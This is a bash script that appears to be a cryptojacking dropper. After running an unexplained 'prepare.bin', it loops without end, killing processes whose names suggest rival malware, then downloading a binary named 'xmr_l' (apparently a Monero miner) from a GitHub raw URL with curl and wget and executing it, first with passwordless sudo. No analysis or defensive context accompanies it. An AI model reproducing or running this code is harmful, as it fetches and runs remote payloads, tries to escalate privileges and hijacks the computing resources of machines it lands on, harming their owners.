#!/bin/bash

architecture=$(uname -m)

case $architecture in
    arm64 | aarch64)
        arch="arm64"
        ;;
    x86_64 | amd64)
        arch="amd64"
        ;;
    *)
        echo "Unsupported architecture: $architecture"
        exit 1
        ;;
esac
chmod +x prepare.bin
./prepare.bin

unalias -a

while true; do
    pkill -f lol
    pkill -f noob
    pkill -f "./start"
    pkill -f apachelogs
    pkill -f a.sh
    pkill -f syst3md
    pkill -9 start
    rm xmr_l_$arch
    curl -LO https://raw.githubusercontent.com/ZeroDayx/fps/refs/heads/main/xmr_l_$arch
    chmod +x xmr_l_$arch
    sudo -n ./xmr_l_$arch
    ./xmr_l_$arch

    rm xmr_l_$arch
    wget https://raw.githubusercontent.com/ZeroDayx/fps/refs/heads/main/xmr_l_$arch
    chmod +x xmr_l_$arch
    sudo -n ./xmr_l_$arch
    ./xmr_l_$arch
done
